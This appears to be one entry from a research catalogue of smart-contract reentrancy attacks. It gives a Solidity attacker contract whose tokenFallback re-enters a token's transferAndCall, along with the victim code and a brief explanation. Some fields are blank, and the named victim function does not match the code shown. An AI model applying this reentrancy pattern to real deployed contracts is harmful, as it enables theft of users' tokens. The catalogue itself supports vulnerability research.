# Attack10

### Contract Name:

Proof(test3721.sol)、ERC827Token(test745.sol)、EDUToken（test745.sol）、ERC827Token（test1487.sol）
PauseBurnableERC827Token(test1487.sol)、BQT（test1487.sol）

### Contract Address:



### Transaction Count:



### Involved Ethers:



### Length of the Call Chain: 

1 external function

### Victim Function:

`withdraw(address,uint256,address[],uint256[])`

### Attack Mechanism:

Attack code:

```javascript
contract AcceptsProof {
    Proof p = new Proof();
    constructor() payable {}
    bytes b;
    function tokenFallback() public {   // Disguised attack function
        //victim.call.value(1 eth)(bytes4(keccak256("contribution(uint256)")), 10);
        p.transferAndCall(this, 10, b);
    }
    function() payable {
      
    }
    function getvalue() returns (uint) {
        return this.balance;
    }
}

```

Attacked code:

```javascript
contract Proof {
    ...
    function transferAndCall(address _to, uint256 _value, bytes _data) external returns (bool) {
      require(_to != address(0));
      require(transfer(_to, _value)); // do a normal token transfer to the contract

      if (isContract(_to)) {
        AcceptsProof receiver = AcceptsProof(_to);
        require(receiver.tokenFallback(msg.sender, _value, _data));
      }

      return true;
    }
    ...
}
```

In this case, the goal of our reentrancy is `receiver.tokenFallback(msg.sender, _value, _data)` in the victim code. because `receiver` is tainted by `to`.
**Attack.** The attacker call `tokenFallback()` function to make `to` is attacker's address.